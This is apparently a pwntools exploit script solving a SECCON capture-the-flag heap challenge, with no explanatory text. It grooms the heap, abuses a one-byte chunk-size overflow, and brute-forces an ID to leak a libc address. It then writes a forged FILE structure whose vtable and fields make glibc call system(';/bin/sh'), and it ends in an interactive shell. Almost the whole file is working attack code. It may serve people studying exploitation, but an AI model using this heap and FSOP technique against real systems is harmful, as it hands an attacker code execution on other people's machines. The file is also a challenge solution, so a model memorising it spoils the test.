from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'free3.seccon.games'
PORT =  8215

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def alloc(n):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'size: ', str(n).encode())
    r.recvuntil(b'ID:')
    return int(r.recvuntil(b' ', True), 16)

def edit(idx, data):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'id: ', str(idx).encode())
    r.sendafter(b'): ', data)
def try_edit(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'id: ', str(idx).encode())
    ret = r.recvuntil(b'\n', timeout=0.2)
    if len(ret) == 0:
        ret = r.recvuntil(b' ')
    if  b'Not found' not in ret:
        return int(ret.split(b'(')[1].split(b')')[0])
    return 0


def rel(idx):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'id: ', str(idx).encode())

r = start()
for i in range(8):
    ids = []

    if i == 0:
        for _ in range(0x2):
            ids.append(alloc(0x400))
        ids.append(alloc(0x400))
        edit(ids[2], b'a'*0x3f8+b'\x41\x01\n')
        ids.append(alloc(0x400))
        for x in ids:
            rel(x)
    else:
        for _ in range(0x5):
            ids.append(alloc(0x400))
        for x in ids:
            rel(x)
        ids.append(alloc(0x3c0))
        ids.append(alloc(0x280))
        edit(ids[6], str(i).encode()*0x278+b'\x41\x01\n')
        ids.append(alloc(0x400))
        for x in ids:
            rel(x)

idx = []
ids.append(alloc(0xd0))
for i in range(0x7000, 0x8000):
    leak_lo = try_edit(i)
    if leak_lo != 0:
        leak_hi = i
        leak = leak_hi << 32 | leak_lo
        r.sendline(b'a')
        break

if args.D:
    #debug(r, [0x1512])#release
    debug(r, [0x1480])#edit

print(f'{leak = :#x}')
base = leak - 0x203c20
print(f'{base = :#x}')
stderr = base + 0x2044e0
stderr_lock = base + 0x205700
system = base + 0x58740
vtable = base + 0x2022e8 - 0x18
nl_global_locale_0 = base + 0x1ffe20

#ids.append(alloc(0x30))
#rel(ids[-1])
payload = b''
#payload += flat(stderr-0x10, stderr-0x10, stderr-0x10, stderr-0x10)
payload += b'@'*0x780
payload += flat(nl_global_locale_0, base + 0x200500)
payload += flat(base + 0x200640, base + 0x1ffd40)
payload += flat(base + 0x2002c0, base + 0x200260)
payload += flat(0, base + 0x200580)
payload += flat(base + 0x200480, base + 0x1ffca0)
payload += flat(base + 0x2005e0, base + 0x200200)
payload += flat(base + 0x200140, base + 0x1b28c0)
payload += flat(base + 0x1b19c0, base + 0x1b1fc0)
payload += flat(base + 0x1cca38, base + 0x1cca38) * 6
payload += flat(base + 0x1cca38, 0)
payload += flat(0, 0)
payload += flat(base+0x2044e0, 0) #left:io_list_all
payload += flat(0, 0)

fsop = b''
fsop += flat(0x0101010101010101, u64(b';/bin/sh')) # flags, readp
fsop += flat(0, 0) # reade, readb
fsop += flat(0, 1) # writeb, writep
fsop += flat(0, 0) # bufb, bufp
fsop += flat(0, 0) # bufe, saveb
fsop += flat(0, 0) # backb, savee
fsop += flat(0, 0) # markers, chain
fsop += flat(system, 0) # fileno|flags2, old_offset
fsop += flat(0, stderr_lock) # 0, lock
fsop += flat(0, 0) # offset, codecvt
fsop += flat(stderr, 0) # wide_data, freeres_list
fsop += flat(0, 0) # freeres_buf
fsop += flat(0xffffffff, 0) # freeres_buf
fsop += flat(0, vtable) # 0, vtable
fsop += flat(stderr+8)


payload += fsop

edit(leak_hi, payload+b'\n')
#ids.append(alloc(0xe0))

r.interactive()
r.close()

